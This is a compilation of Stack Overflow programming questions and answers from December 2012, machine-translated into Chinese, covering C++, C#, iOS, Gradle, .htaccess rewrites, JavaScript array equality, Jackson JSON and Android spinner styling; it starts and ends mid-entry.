DataReaders 或 DataWriters 描述**了数据的存储方式**。例如，您`BinaryReader`读取字节序列，而 a`[TextReader](http://msdn.microsoft.com/en-us/library/System.IO.TextReader.aspx)`读取具有给定编码的文本。但两者都可以用于同一个流。

回到您的问题：您`BinaryReader`从流中读取二进制数据。该`BaseStream`属性返回读取器从中读取数据的流的实例。这就是您需要`BinaryReader`使用流实例初始化的原因。你不能告诉计算机从任何地方读取二进制数据！;)

# c++ - 声明后初始化对象时出现“调用不匹配”

> ID：13703202
> 
> 赞同：0
> 
> 时间：2012-12-04T12:43:47.450
> 
> 标签：c++, oop

以下代码给了我

```
test2.cc:248:14: error: no match for call to '(Integrator) (Input, double)'
test2.cc:249:11: error: no match for call to '(Integrator) (Integrator&, double)' 
```

关于编译。

```
class Integrator : public Block {
    private:
            ... 
        Input input;    
        double init_value;              
    public:
        Integrator();
        Integrator(Input i, double initval = 0) : input(i), init_value(initval) {}
        Integrator(Integrator &i, double initval = 0) : input(i), init_value(initval) {}
...
};

// + is overloaded
Input operator + (Input a, Input b) { return new Add(a,b); }

int main() {
    Constant a(4.0); // Input
    Integrator x,y;
    ...
    x(y + a, 0.0); // + is overloaded for Inputs
    y(x, -2.0);
    ...
} 
```

我只发布代码片段，因为这是我的作业。如果这些还不够，我可以添加更多。我看到类似的代码在工作，所以我尝试使用它（进行了一些编辑），但它对我不起作用......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:47:11.027

You can't initialize objects after they're declared. `x()` tries to call `x` as a function.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T12:47:29.577

What you are trying to do would only work on initialization. Or You need to create a member function taking such arguments.

```
Integrator x; 
x(1.2) // Calling the constructor doesn't make sense here 
```

You can only call the constructor directly on initialization (as already said).

```
Integrator x(1.2) ; 
```

A member function sounds like the way to go.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-04T12:48:48.967

在定义对象后，您不能使用构造函数“初始化”对象。您可以做的是覆盖`operator()`您想要的语法的函数：

```
class Integrator : public Block {
    ...

public:
    void operator()(Input i, double initval = 0)
        {
            input = i;
            init_value = initval;
        }

    ...
}; 
```

# c# - 优化通用方法逻辑

> ID：13703203
> 
> 赞同：3
> 
> 时间：2012-12-04T12:43:49.690
> 
> 标签：c#, class, c#-4.0, logic, generic-method

我有一个通用方法，我们可以将 T 作为接口类型传递。方法返回对应T类型的数据列表。对于这种方法，我有 20-25 个相同的条件，我该如何优化逻辑。

类实现接口。示例 Student 类实现 IStudent 接口。

```
public ObservableCollection<T> GetAll<T>()
    {
        try
        {
            if (typeof(T) == typeof(IStudent))
            {                 
                return GetAll<T, Student>();
            }
            else if (typeof(T) == typeof(IZone))
            {
                return GetAll<T, Zone>();
            }
            else if (typeof(T) == typeof(IEmployee))
            {
                return GetAll<T, Employee>();
            }
            else if (typeof(T) == typeof(ICourse))
            {
                return GetAll<T, Course>();
            }
         }
    } 
```

这里调用者传递接口类型 T 并检查 T 的类型。我传递给其他函数 T 和将返回 T 列表的类。基类中的其他函数我无法更改。谁能给我一些相同的建议。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T12:46:51.800

我认为您根本不需要泛型，您可以创建一个由所有类型实现的通用接口：

```
public interface IObservableElement
{
    public ObservableCollection<IObservableElement> GetAll();
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T12:56:10.313

你可以尝试通过反思来做到这一点。

```
public ObservableCollection<T> GetAll<T>()
{
    var typeName = typeof(T).FullName;
    var indexOfDot = typeName.LastIndexOf('.');
    var newTypeName = typeName.SubString(0, indexOfDot) + '.' + typeName.SubString(indexOfDot + 1);
    var newType = Type.GetType(newTypeName);
    var methodTypes = new [] { typeof(T), newType };
    var method = GetType().GetMethod("GetAll");
    var typedMethod = method.MakeGenericMethod(methodTypes);
    return (ObservableCollection<T>) typedMethod.Invoke(this, new object[0]);
} 
```

不漂亮，但应该做的工作和做的一般。

当前方法的唯一警告是该`GetAll`方法被泛型参数重载，因此它可能无法为您提供正确的方法，或者因为有两个方法而失败。我会看看是否可以指出正确的。

# iphone - 如何将自定义图像添加到导航栏并保持返回方法的完整性？

> ID：13703206
> 
> 赞同：0
> 
> 时间：2012-12-04T12:44:01.467
> 
> 标签：iphone, ios, uinavigationcontroller, uinavigationbar

我有以下添加自定义图像作为后退按钮。问题是它覆盖了默认的导航控制器返回方法。

我该如何纠正？

```
 UIButton *button =  [UIButton buttonWithType:UIButtonTypeCustom];
[button setImage:[UIImage imageNamed:@"button-back-arrow.png"] forState:UIControlStateNormal];
//[button addTarget:self action:@selector(favouriteButtonClicked:) forControlEvents:UIControlEventTouchUpInside];
[button setFrame:CGRectMake(280, 25, 40, 29)];
self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithCustomView:button]; 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:50:48.847

只需添加这一行和方法..

```
[button addTarget:self 
                       action:@selector(BtnBack_Clicked:)
             forControlEvents:UIControlEventTouchDown]; 
```

并调用此方法

```
-(IBAction)BtnBack_Clicked:(id)sender{

    [self.navigationController popViewControllerAnimated:YES];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:55:51.510

```
UIView *btnView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 84, 31)];
UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
btn.frame = CGRectMake(0, 0, 84, 31);
[btn setBackgroundImage:[UIImage imageNamed:@"yourImage.png"] forState:UIControlStateNormal];
[btn addTarget:self action:@selector(action) forControlEvents:UIControlEventTouchUpInside];
[btnView addSubview:btn];
self.navigationItem.leftBarButtonItem   = [[UIBarButtonItem alloc] initWithCustomView:btnView];
[btnView release]; 
```

# graph - 如何让 graphviz 重复图中的节点以创建树状图像？

> ID：13703207
> 
> 赞同：3
> 
> 时间：2012-12-04T12:44:02.717
> 
> 标签：graph, tree, graphviz, dot

我在graphviz上有以下图表：

![具有收敛路径的原始图](../Images/acae394eb1a994e6551d80636c200af4.png)

如何让 graphviz 重复图中的节点，以便我可以获得这样的树状图像：

![具有重复标签的派生树](../Images/d6a605adffee30a636b83ccafdb5976c.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:22:49.707

我认为您不能在 graphviz 中对图形进行这种修改。您应该使用您想要的结构为 graphviz 提供不同的图表。该图可以通过如下过程（伪代码）获得：

```
function visit(path: a list of nodes):
  let n be the last node on the path
  for every child c of n:
    write (a copy of) c to output
    if c is not in path:
      visit(path + [c])
write root to output
visit([root]) 
```

除了这个列表`path`，您还可以将节点标记为`visited`递归调用之前并在调用之后删除该标志：

```
function visit(n: a node):
  mark n as visited
  for every child c of n:
    write (a copy of) c to output
    if c is not marked as visited:
      visit(c)
  mark n as not visited
write root to output
visit(root) 
```

# git - 带有 github 的 Git - 将特定文件分离到不同的存储库/分支，同时能够将其与主分支开发同步

> ID：13703208
> 
> 赞同：0
> 
> 时间：2012-12-04T12:44:06.867
> 
> 标签：git, github

**问题：**如何从 Github 存储库中分离特定文件以分离开发存储库（或分支），同时保留从上游同步（*git pull* _）和同步回（*拉取请求*）到原始存储库的可能性。

**用例：**我在 GitHub 上分叉了一个[库](https://github.com/alonisser/WebcamSwiper)，我正在做各种改进、更改等。我的问题是分叉的 repo 实际上是一个完整的演示站点，包括 lib，我不想要 dem，因为我是实际上与另一个演示站点一起工作。**对我来说，最佳解决方案**是能够提交到我的演示站点中的库，并且能够保留与原始存储库的连接，而无需删除原始演示站点文件或复制我的。

是的，我想我可以使用一些 make/build 脚本来复制文件，但它看起来不像是一个优雅（且可维护）的解决方案。

如果这是解决方案，那么最适合这项工作的工具是什么？我听说过 git hooks，但从未真正使用过它们。也许 TraviCI 可以来救援？别的东西？

我会很高兴得到任何帮助

**编辑：**按照这里的一些建议，我检查了[git remote](http://gitref.org/remotes/)。但这适用于回购范围，我需要分离一个特定文件（或除特定文件外的所有文件），只有她才能保持与原始回购的远程推/拉连接。

**另一个编辑：**遵循关于使用 git *submodules*的建议）我想澄清一下：*submodules*似乎解决了一半的问题 - 关于将 lib 从演示站点中分离出来的一半，实际上，如果我是最初的维护者，我可以这样做，允许其他人只分叉没有演示站点的库。因为我不是维护者，所以（如果我理解正确的话）将库分离到一个子模块并不能解决在不同步演示站点的其余部分的情况下保持它与原始库同步的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T08:03:22.483

Git 不支持你想做的事情。Git 具有很大的灵活性，但希望您将单独的内容保存在单独的文件夹中。如果您编写一些 shell 脚本并封装大量 git 命令，您可以使您的计划生效，但我不建议这样做。

您可以做的是：将其他 repo 作为[submodule](http://git-scm.com/book/en/Git-Tools-Submodules)放在它自己的文件夹中。如果您在其他地方还需要该文件，请对其进行符号链接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:40:07.580

据我了解，您正在寻找的是拥有一个远程仓库。检查您正在寻找的是否是这样的：http: [//gitref.org/remotes/](http://gitref.org/remotes/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-23T16:39:10.903

我想我找到了解决这个问题的正确方法。**与子模块**类似， 但对这个问题更具体：使用子**[分支 (filter-branch)](https://help.github.com/articles/splitting-a-subpath-out-into-a-new-repo)**。

# android - Android ADB 通过蓝牙锁定调试

> ID：13703210
> 
> 赞同：1
> 
> 时间：2012-12-04T12:44:10.303
> 
> 标签：android, debugging, adb

我设法将 ADB 配置为通过蓝牙连接到手机（我无法使用 wifi）。但是，一旦电话连接上，ADB 似乎会锁定，键入“ADB logcat”不会显示任何内容，我必须按 ctrl 'C' 退出。键入 ADB devices 会显示该设备已连接。有没有人有任何想法？

# objective-c - 剪贴板的截屏在 Cocoa 中有效，但不能保存到文件或新邮件消息

> ID：13703213
> 
> 赞同：1
> 
> 时间：2012-12-04T12:44:21.620
> 
> 标签：objective-c, macos, cocoa

作为注册用户，我是 Stackoverflow 的新手，但它在学习 Cocoa 的开始方面帮助了我很多。但是，有一个问题我无法借助现有的主​​题/问题来解决，所以我决定自己在这里问一个问题。

我正在尝试将屏幕捕获与 NSTask 一起使用，以下代码适用于我的应用程序：

```
NSArray *args = [NSArray arrayWithObjects: @"-c", nil];
[[NSTask launchedTaskWithLaunchPath: @"/usr/sbin/screencapture" arguments: args] waitUntilExit]; 
```

它将屏幕截图保存到我的剪贴板，但是，我传递给 screencapture 的所有其他参数都不起作用。相同的代码在终端中确实有效。

例如，如果我`screencapture -M mailme.jpg`进入终端，则会打开一条新邮件消息（与保存到根文件夹或桌面相同）。在我的应用程序中它是行不通的。

以下代码：

```
NSArray *args = [NSArray arrayWithObjects: @"**-M mailme.jpg**", nil];
[[NSTask launchedTaskWithLaunchPath: @"/usr/sbin/screencapture" arguments: args] waitUntilExit]; 
```

结果如下：

```
screencapture: illegal option --  
usage: screencapture [-icMPmwsWxSCUtoa] [files]
  -c         force screen capture to go to the clipboard
  -C         capture the cursor as well as the screen. only in non-interactive modes
  -d         display errors to the user graphically
  -i         capture screen interactively, by selection or window
               control key - causes screen shot to go to clipboard
               space key   - toggle between mouse selection and
                             window selection modes
               escape key  - cancels interactive screen shot
  -m         only capture the main monitor, undefined if -i is set
  -M         screen capture output will go to a new Mail message
  -o         in window capture mode, do not capture the shadow of the window
  -P         screen capture output will open in Preview
  -s         only allow mouse selection mode
  -S         in window capture mode, capture the screen not the window
  -t<format> image format to create, default is png (other options include pdf, jpg, tiff and other formats)
  -T<seconds> Take the picture after a delay of <seconds>, default is 5
  -w         only allow window selection mode
  -W         start interaction in window selection mode
  -x         do not play sounds
  -a         do not include windows attached to selected windows
  -r         do not add dpi meta data to image
  -l<windowid> capture this windowsid
  -R<x,y,w,h> capture screen rect
  files   where to save the screen capture, 1 file per screen 
```

当我`test.png`用作参数时，会出现与终端中相同的输出：

```
libpng warning: zero length keyword
libpng warning: Empty language field in iTXt chunk 
```

，但没有保存文件。

这是否意味着权限有问题？我应该将输出保存在我的应用程序中吗？喜欢：

```
if ([task terminationStatus] == 0)
 {

 } 
```

我尝试了很多方法，但我希望/怀疑这个问题有一个非常简单的解决方案，我只是没有看到。

提前感谢您的时间和帮助。

弗兰斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:11:13.190

我认为问题在于单个参数**"-M mailme.jpg"**。

如果将其分成 2 个参数，它应该可以工作，即：

```
NSArray *args = [NSArray arrayWithObjects: @"-M", @"mailme.jpg", nil]; 
```

# gradle - 使用 Gradle，是否可以直接调用 GradleBuild 而不是将其指定为类型？

> ID：13703218
> 
> 赞同：3
> 
> 时间：2012-12-04T12:44:37.207
> 
> 标签：gradle

我的 build.gradle 中有这个：

```
task cleanCommon(type: GradleBuild) {
  buildFile = 'common/build.gradle'  
  tasks = ['clean']  
}

task cleanCrawler(type: GradleBuild) {
  buildFile = 'crawler/build.gradle'
  tasks = ['clean']
}

task cleanPortlet(type: GradleBuild) {
  buildFile = 'portlet/build.gradle'
  tasks = ['clean']
}

task cleanAll(dependsOn: ['cleanCommon', 'cleanCrawler', 'cleanPortlet']) { 
} 
```

它是如此冗长。有什么方法可以像下面的伪代码那样做吗？

```
taskCleanAll {
    GradleBuild.pleaseRunTask('common/build.gradle', 'clean')
    GradleBuild.pleaseRunTask('crawler/build.gradle', 'clean')
    GradleBuild.pleaseRunTask('portlet/build.gradle', 'clean')
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-04T16:41:58.830

您不能直接调用任务，但还有很多其他方法可以对代码进行抽象。例如：

```
def createBuildTask(name, buildFile) {
    task "$name"(type: GradleBuild) {
        buildFile = buildFile
        tasks = ['clean']
    }
}  

createBuildTask("cleanCommon", "common/build.gradle")
createBuildTask("cleanCrawler", "crawler/build.gradle")
createBuildTask("cleanPortlet", "portlet/build.gradle") 
```

我想知道你为什么首先使用这个`GradleBuild`任务，但这是一个不同的讨论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-01-26T09:04:44.420

```
def List buildFileList = ['common/build.gradle', 'crawler/build.gradle', 'portlet/build.gradle']

task cleanAll << {
    buildFileList.each() {
        def tempTask = tasks.create(name: "execute_$it", type: GradleBuild)
        tempTask.buildFile="$it"
        tempTask.tasks = ['clean']
        tempTask.execute()
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:24:25.120

像这样的东西可以工作......请注意，这未经测试。但是为什么你认为它如此冗长？我认为它相当干净。

```
task cleanAll << {
  StartParameter startParameter = project.gradle.startParameter.newBuild()
  startParameter.tasks = ['clean']
  runGradle('portlet/build.gradle', startParameter)
  runGradle('crawler/build.gradle', startParameter)
  runGradle('common/build.gradle', startParameter)
}

def runGradle(buildFile, params) {
  params.buildFile = buildFile
  GradleLauncher.newInstance(params).run().rethrowFailure();
} 
```

另一种选择是提取任务创建：

```
task cleanAll
def createCleanTask(name) {
  task "${name}Clean"(type: GradleBuild) {
    tasks = ['clean']
    buildFile = "${name}/build.gradle"
  }
  cleanAll.dependsOn("${name}Clean")
}

createCleanTask("crawler")
createCleanTask("portlet")
createCleanTask("common") 
```

# .htaccess - .htaccess 重写帮助请求

> ID：13703220
> 
> 赞同：0
> 
> 时间：2012-12-04T12:44:43.293
> 
> 标签：.htaccess

我希望能在配置 .htaccess 文件时遇到一些小问题获得一些帮助。基本上，我想从 URL 字符串中检索 2 个变量。

例如：

如果有人进入 www.website.com.au/folder/category/item.php

我希望 .htaccess 检索最后两个变量（类别和项目）并将它们解析到我的 display-item.php 页面。

我对我需要做的事情有一个粗略的想法（如下所示），尽管我一直在阅读所有的 tutes，但我有点困惑。

任何帮助将不胜感激。

:) 保罗

```
RewriteRule /folder/(.*)/(.*).php /folder/display-item.php?category=$1&item=$2 [L] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T12:56:56.343

```
RewriteRule ^folder/(.*)/(.*).php /folder/display-item.php?category=$1&item=$2 [L] 
```

工作一种享受。设法让它工作。

# javascript - 为什么 [] == [] 在 JavaScript 中为假？

> ID：13703222
> 
> 赞同：13
> 
> 时间：2012-12-04T12:44:45.923
> 
> 标签：javascript, operators, comparison-operators

我正在处理代码的一部分，其中我有一个看起来像`[[data]]`. 通过`data`Django 模板引擎在服务器端呈现。所以我的代码如下所示：

```
var data = {{ series|safe }}; 
// data will be [[]] if no data is present
if (data ==[[]])
  console.log('no data'); 
```

`if`总是`false`返回。这意味着在`[[]] == [[]]`是`false`，我的测试表明`[]==[]`也是`false`如此。

任何描述将不胜感激。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-04T12:46:48.060

Because `==` (and `===`) test to see if two objects are *the same object* and not if they are *identical* objects.

Most test frameworks will include functions such as [`deepEqual`](http://api.qunitjs.com/deepEqual/) if you want to see if two objects are identical.

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-12-04T12:48:38.417

该表达式`[] == []`具有以下等价符号：

```
new Array() == new Array() 
```

并且知道这`Array`也是一个，比较的行为在[ECMAScript 语言规范](http://www.ecma-international.org/ecma-262/5.1/)[的抽象相等比较算法](http://www.ecma-international.org/ecma-262/5.1/#sec-11.9.3)部分中得到了`Object`明确的解释：

比较 x == y，其中 x 和 y 是值，产生真或假。如下进行这样的比较：

1.  如果 Type(x) 与 Type(y) 相同，则
    1.  如果 Type(x) 未定义，则返回 true。
    2.  如果 Type(x) 为 Null，则返回 true。
    3.  如果 Type(x) 是 Number，那么
        1.  如果 x 是 NaN，则返回 false。
        2.  如果 y 是 NaN，则返回 false。
        3.  如果 x 与 y 的数值相同，则返回 true。
        4.  如果 x 为 +0 且 y 为 -0，则返回 true。
        5.  如果 x 为 -0 且 y 为 +0，则返回 true。
        6.  返回假。
    4.  如果 Type(x) 是字符串，那么如果 x 和 y 是完全相同的字符序列（相同长度和对应位置的相同字符），则返回 true。否则，返回假。
    5.  如果 Type(x) 是布尔值，如果 x 和 y 都为真或都为假，则返回真。否则，返回假。
    6.  **如果 x 和 y 引用同一个对象，则返回 true。否则，返回假。**
2.  如果 x 为 null 且 y 未定义，则返回 true。
3.  如果 x 未定义且 y 为空，则返回 true。
4.  如果 Type(x) 是 Number 并且 Type(y) 是 String，则返回比较结果 x == ToNumber(y)。
5.  如果 Type(x) 是 String 并且 Type(y) 是 Number，则返回比较结果 ToNumber(x) == y。
6.  如果 Type(x) 是 Boolean，则返回比较 ToNumber(x) == y 的结果。
7.  如果 Type(y) 是 Boolean，则返回比较结果 x == ToNumber(y)。
8.  如果 Type(x) 是 String 或 Number 且 Type(y) 是 Object，则返回比较结果 x == ToPrimitive(y)。
9.  如果 Type(x) 是 Object 并且 Type(y) 是 String 或 Number，则返回 ToPrimitive(x) == y 的比较结果。
10.  返回假。

您的比较结果由`1.6`上面突出显示的 解释。

**替代表达**

在你的情况下，我建议简单地使用这个条件：

```
if (a[0].length == 0) {
    console.log('no data');
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-12-04T12:48:10.840

因为`[]`创建了一个新数组，所以您将一个数组对象与另一个数组对象进行比较。

比较的不是数组的内容，而是对象引用。它们不相等，因为它不是同一个对象实例。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-04T13:06:21.250

Javascript 与 Java 类似，`==`运算符比较原始类型的*值*，但比较对象的*引用*。您正在创建两个数组，`==`操作员告诉您它们没有指向内存中相同的确切对象：

```
var b = new Array( 1, 2, 3 );
var c = new Array( 1, 2, 3 );

console.log(b == c); // Prints false.
console.log(b == b); // Prints true.
console.log(b === c); // Prints false.

b = c;

console.log(b == c); // Now prints true. 
```

如果要比较对象的值，则必须手动进行[深度比较。](https://stackoverflow.com/questions/4025893/how-to-check-identical-array-in-most-efficient-way)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-06-23T07:26:18.713

因为数组是引用类型，这意味着，例如，如果您创建一个数组

**让 a = [1,2,3,4,5];**

**让 b = a;**

b 实际上只是数组 a 的引用，所以如果你比较它们

**a===b 为真**，

因为它们基本上是链接在一起的。所以如果你将某些东西更改为数组 b 它也将更改为数组 a，

**b[0] = "测试";**

**数组 a 现在是 ["test",2,3,4,5];**

*但如果你这样做*

**让 a = [1,2,3,4,5];**

**让 b = a.slice(0);**

然后比较它们

**a===b 是假的**

因为现在它们都是不同的数组，这意味着如果你改变数组 b，它不会影响数组 a

**b[0] =“你好”；**

数组 a 仍然是**[1,2,3,4,5]**

而数组 b 现在是**["hello",2,3,4,5]**

**当您比较[]===[] 为假**时，也会发生这种情况

 **因为基本上你对 JavaScript 的要求是它们是否是同一个 Array 而不是

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-04T12:47:46.913

Because they are different instances of an Array, thus not equal.**

# java - 带有编号数组的json的杰克逊反序列化

> ID：13703225
> 
> 赞同：0
> 
> 时间：2012-12-04T12:44:57.030
> 
> 标签：java, arrays, json, list, jackson

我有一个这样的 JSON 字符串：

```
{
  "1": {
    "entity_id":"1",
    "status":"canceled"
  },
  "2": {
    "entity_id":"2",
    "status":"pending"
  }
} 
```

我正在努力寻找反序列化时使用的正确设置。`"1"`我偶然发现了上面映射和`"2"`id 的样子。

我的对象映射器如下所示：

```
ObjectMapper mapper = new ObjectMapper();
mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
mapper.configure(DeserializationConfig.Feature.READ_ENUMS_USING_TO_STRING, true);
mapper.configure(DeserializationConfig.Feature.ACCEPT_SINGLE_VALUE_AS_ARRAY, true); 
```

我已经尝试了各种类来映射它，但是在使用以下行时它们都没有工作：

```
XXX jsonObject = mapper.readValue(json, XXX.class); 
```

`XXX`关于课程应该是什么样子的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T15:52:52.590

解决方案是将 json 映射到映射中，如下所示：

```
Map<String, Object> map = mapper.readValue(message, new TypeReference<Map<String, Object>>() {}); 
```

在实际代码中，我将 Object 替换为映射 entity_id 和 status 等字段的 java 类

# html - 在 iframe 中显示一个 div

> ID：13703229
> 
> 赞同：1
> 
> 时间：2012-12-04T12:45:08.610
> 
> 标签：html, iframe

我在 iframe 中有一个 div，当我们单击输入框时会出现该 div。

iframe 看起来像这样

```
<iframe src='mycontrol.html' width='300' height='50' /> 
```

下面是 mycontrol.html 的代码

```
<div>
    <input type='text' />
    <div style='height:80px;'>
         This will be shown when we click in the above text box.
    </div>
</div> 
```

当用户单击输入框时，我有 javascript 来显示 div，问题是因为这个 div 的高度大于 iframe 的高度并且没有完全显示。由于 iframe，div 底部的某些区域被切割。

我的问题，有没有在不调整 iframe 大小的情况下使用 javascript 或 css 显示完整的 div ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T15:27:25.160

也许这就是你需要的？它并没有完全`div`摆脱困境，`iframe`但看起来确实如此。[在jsFiddle.net](http://jsfiddle.net/n5nds/1/)工作演示

在主页中：

```
#wrapper {
    position: relative;
    z-index: 1000;
}
#frame {
    width: 300px;
    height: 120px;
    margin-bottom: -70px;
} 
```

和 HTML：

```
<div id="wrapper">
    <iframe id="frame" src="frame.htm" frameborder="0"></iframe>
</div>
<p>Some text below IFRAME in main window.</p> 
```

在 mycontrol.html 中：

```
BODY {
    overflow: hidden;
}
#div {
    width:100px;
    height: 80px;
    background: #ff0;
    border: 1px solid #000;
    display: none;
} 
```

和 HTML：

```
<input type="text" onfocus="document.getElementById('div').style.display='block';" onblur="document.getElementById('div').style.display='none'";/>
<div id="div"></div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:52:55.893

我认为您可以将 css overflow:scroll 用于您的 iframe

```
iframe {
 overflow:scroll;
} 
```

# c# - 带 1px 边框的无边框 Winform

> ID：13703231
> 
> 赞同：7
> 
> 时间：2012-12-04T12:45:13.957
> 
> 标签：c#, winforms, visual-studio-2010, visual-studio, user-interface

这听起来像是一个奇怪的问题，但我有 C# Winform，我将 FormBorderStyle 设置为 None。到目前为止一切都很好，但我想知道是否有办法在我的表单周围添加一个 1px 边框？我知道我可以通过创建自己的图像来做到这一点，但我想知道是否有更自然的方式来做到这一点。谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-04T13:03:58.557

我认为使用图像，或为使用 GDI+ 轻松绘制的东西创建不必要的控件是浪费资源。

我认为最简单的解决方案是覆盖`OnPaint`表单的方法并自己绘制边框：

```
protected override void OnPaint(PaintEventArgs e)
{
    e.Graphics.DrawRectangle(Pens.Black, this.Bounds);
} 
```

当然，您也可以使用自己`Pen`的颜色和宽度。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-21T22:29:41.350

在表单中使用填充 1;1;1;1 并为表单设置背景颜色，然后在表单中放置一个面板。为面板设置白色或其他正常背景颜色。并在父控制器中设置停靠。表单的背景颜色将充当边框。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T12:51:01.530

向表单添加一个`Panel`（并设置它的边框）怎么样？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-04T13:01:26.723

感谢您的建议，我决定创建 4 个 1px 标签并在每一侧的边缘折腾。那样： 1\. 如果您使用组合框或面板，他们会在一边照顾自己的事情，而不是占据整个中间。2.您可以选择更改边框颜色。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T12:49:50.757

没有更*自然*或非*自然的*方式来做到这一点。这取决于你想要什么。

如果您在表单上放置背景图像，则必须考虑一个事实，即为了能够支持可调整大小，您必须具有可调整大小的背景图像。

如果你只是在背景上用或*绘制*，你也可以支持可调整大小的形式，但如果你想做一些很酷的事情，你必须多做些工作，而不是使用图像更容易。`Pen``Brush`

您可以在表单中嵌入一些控件，并使用它们的颜色来营造边框的感觉。像控制一样，您可以使用`Panel`，如评论中所建议的那样，可以使用`GroupBox`创建薄的 broder arround 或其他东西。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-12-16T11:15:29.370

我创建了这个方法，因此您可以轻松设置边框位置、颜色和粗细。

```
private void customBackgroundPainter(PaintEventArgs e, int linethickness = 2, Color linecolor = new Color(), int offsetborder = 6)
{
    Rectangle rect = new Rectangle(offsetborder, offsetborder, this.ClientSize.Width - (offsetborder * 2), this.ClientSize.Height - (offsetborder * 2));

    Pen pen = new Pen(new Color());
    pen.Width = linethickness;
    if (linecolor != new Color())
    {
        pen.Color = linecolor;
    }
    else
    {
        pen.Color = Color.Black;
    }

    e.Graphics.DrawRectangle(pen, rect);
} 
```

你可以`OnPaintBackground`像这样使用它：

```
protected override void OnPaintBackground(PaintEventArgs e)
{
    base.OnPaintBackground(e);
    customBackgroundPainter(
    e,
    linethickness: 3,
    linecolor: Color.DarkOrange,
    offsetborder: 5
    );
} 
```

# javascript - 将新项目添加到清单

> ID：13703232
> 
> 赞同：0
> 
> 时间：2012-12-04T12:45:13.837
> 
> 标签：javascript, jquery, html, forms

我正在尝试创建一个允许用户添加自己的项目的清单。

这是我的 HTML 的一部分：

```
<tr>
    <td>
        <input name="checkbox65" id="checkbox65" type="checkbox" />
    </td>
    <td>
        <label for="checkbox65">Get directions for where you are going</label>
    </td>
</tr>
 <h3>
   My items
  </h3>

<fieldset data-role="controlgroup">
    <label for="textinput4">Add new item</label>
    </td>
    <input name="new_item" id="textinput4" placeholder="" value="" type="text"
    />
</fieldset>
 <input type="submit" id="add" value="Add" /> 
```

这是我的脚本：

```
<script>
    $('#add').on('click', function (e) {
        var $this = $(this);
        var $newRow = $this.closest('table').find('tr:first').clone();
        $newRow.find(':input').val('');
        $newRow.insertAfter($this.parent());
    });
</script> 
```

但我只是没有得到任何回应..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:23:52.207

## 这是你需要的吗？

## HTML

```
<h3>My items</h3>
<table id="myTable">
    <tr>
        <td>
            <label for="checkbox65">
                <input name="checkbox65" class="checkbox65" type="checkbox" />
                Get directions for where you are going
            </label>
        </td>
    </tr> 
    <tr><td>
    <fieldset data-role="controlgroup">
        <label for="textinput4">
            Add new item
            <input name="new_item" id="textinput4" placeholder="" value="" type="text" />
        </label>
    </fieldset>
    <button id="add">Add</button>
    </td></tr>
</table> 
```

请注意，我已更改`id="checkbox65"`为，`class="checkbox65"`因为您不能两次使用相同的 id。也更改`input type=submit`为新元素`<button>`。`adding`

## JS

```
$('#add').on('click', function (e) {
    var $this = $(this);
    var $firstRow=$this.closest('table').find('tr:first');
    var $newRow = $firstRow.clone();
    $newRow.find(':input').prop('checked', false);
    $newRow.insertAfter($firstRow);
}); 
```

[**演示**](http://jsbin.com/avakut/3/edit)。

**更新：**或者也许[**这个**](http://jsbin.com/avakut/13/edit)或[**这个**](http://jsbin.com/avakut/15/edit)。

# android - 样式 android 微调器

> ID：13703233
> 
> 赞同：26
> 
> 时间：2012-12-04T12:45:18.123
> 
> 标签：android

我正在尝试让我的 android 应用程序更时尚一点，并取得了一些进展，但微调器下拉菜单给我带来了麻烦。我有一个屏幕截图向您展示问题：

![我如何摆脱白色背景](../Images/ad02a513f0417f89bc6c5e0f1af55fc7.png)

我想要的是背景中的白框是透明的，就像在后屏幕上的灰色覆盖层一样，与下拉菜单外的其余屏幕一样。

如果我没记错的话，Android 4.0，API 15。

根据要求，这是我到目前为止的做法。这些是我认为相关的片段，但我可能错过了一些东西。

这是微调器的 xml：

```
<Spinner
    android:id="@+id/edit_countrySpinner"
    android:layout_width="0dip"
    android:layout_height="wrap_content"
    android:layout_weight="1"
    android:entries="@array/edit_countryArray"
    android:gravity="center"
    android:prompt="@string/country_prompt" /> 
```

在我的价值观/style.xml 中。如果我在这里更改背景的颜色，对话框中的背景会发生变化，但所有其余的背景也会发生变化。我还没有弄清楚如何在下拉对话框中更改背景。

```
